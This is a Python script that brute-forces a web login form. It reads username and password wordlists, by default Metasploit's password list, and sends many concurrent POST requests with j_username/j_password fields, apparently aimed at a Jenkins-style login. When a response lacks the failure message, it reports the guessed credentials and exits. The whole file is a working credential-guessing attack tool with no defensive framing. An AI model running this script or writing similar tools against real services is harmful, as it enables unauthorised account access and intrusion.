#! /bin/python3

from requests import Request, get, post, PreparedRequest
from requests.sessions import Session
import click
from pathlib import Path
import sys
import asyncio
import aiohttp
from aiohttp.client import ClientSession
import asyncio
from functools import wraps
import logging
import timeit

logger = logging.getLogger()

logging.basicConfig(level=logging.DEBUG)

def coroutine(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        return asyncio.run(f(*args, **kwargs), debug=True)

    return wrapper

@click.command()
@click.argument("url", type=str, required=True)
@click.option("-u", "user_list", type=Path, default="/usr/share/wordlists/metasploit/password.lst")
@click.option("-p", "password_list", type=Path, default=Path("/usr/share/wordlists/metasploit/password.lst"))
@click.option("-t", "threads", type=int, default=8)
@coroutine
async def crack(url:str, user_list:Path, password_list:Path, threads:int):
    myconn = aiohttp.TCPConnector()
    async with ClientSession(connector=myconn) as session:
        tasks = []
        for data in permutations(user_list, password_list):
            task = asyncio.ensure_future(post_and_check(url, data, session))
            tasks.append(task)
        results = await asyncio.gather(*tasks, return_exceptions=True)
    for result in results:
        if isinstance(result, Exception):
            raise result
    

def permutations(user_list, password_list):
    users = user_list.read_text("latin-1").splitlines()
    users = list(filter(lambda user: not any(char in user for char in ["!","§","$","%","&","/","(",")","=","?",")"] + [str(num) for num in range(10)]), users))
    passwords = password_list.read_text("latin-1").splitlines()
    for user in users:
        for password in passwords:
            yield {"j_username":user,"j_password": password, "Submit":"Sign+in"}
           

async def post_and_check(url, data, session:ClientSession):
    async with session.post(url, data=data) as response:
        result = await response.text()
        if "Invalid username or password" in result:
            print(f"Unsuccessful login for {data}")
        else:
            print(f"Successful login for {data}")
            sys.exit(0)
    

if __name__ == "__main__":
    start = timeit.default_timer()
    crack()
    end = timeit.default_timer()
    print(f"{end-start} seconds")